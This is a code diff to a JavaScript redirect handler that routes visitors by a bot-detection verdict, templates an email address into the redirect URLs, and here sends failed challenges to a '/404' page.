@@ -83,6 +83,7 @@ module.exports = async (req, res) => {
   const hasFailOverride = typeof req.query.fail === 'string' && String(req.query.fail).trim() !== '';
   const passRaw = normalizeUrl(req.query.pass, '/human');
   const failRaw = normalizeUrl(req.query.fail, '/bot');
+  const challengeFailRaw = '/404';
   const challengeRaw = normalizeUrl(req.query.challenge, '/challenge');
   const waitSeconds = Math.max(0, Number(req.query.wait || 10));
   const apiUrl =
@@ -93,7 +94,8 @@ module.exports = async (req, res) => {
 
   const passUrl = applyEmailTemplate(passRaw, email);
   const failUrl = applyEmailTemplate(failRaw, email);
-  const challengeUrl = buildChallengeUrl(challengeRaw, passUrl, failUrl, waitSeconds);
+  const challengeFailUrl = applyEmailTemplate(challengeFailRaw, email);
+  const challengeUrl = buildChallengeUrl(challengeRaw, passUrl, challengeFailUrl, waitSeconds);
 
   const pageUrl = `${proto}://${host}${req.url || '/go'}`;
   const fingerprint = `${host}|${userAgent}|${ip}`;
@@ -136,7 +138,7 @@ module.exports = async (req, res) => {
     if (!useOverrides) {
       if (action === 'allow') {
         const passFromApi = applyEmailTemplate(apiRedirectUrl || '/human', email);
-        const failFallback = applyEmailTemplate(failUrl || '/bot', email);
+        const failFallback = applyEmailTemplate(challengeFailRaw, email);
         const challengeFromDefaults = buildChallengeUrl(challengeRaw, passFromApi, failFallback, waitSeconds);
         return redirect(res, challengeFromDefaults, sessionId);
       }
@@ -149,7 +151,7 @@ module.exports = async (req, res) => {
     }
 
     if (action === 'block') return redirect(res, failUrl, sessionId);
-    if (action === 'challenge') return redirect(res, challengeUrl, sessionId);
+    if (action === 'challenge') return redirect(res, failUrl, sessionId);
     if (action === 'allow') return redirect(res, challengeUrl, sessionId);
     return redirect(res, failUrl, sessionId);
   } catch (_error) {
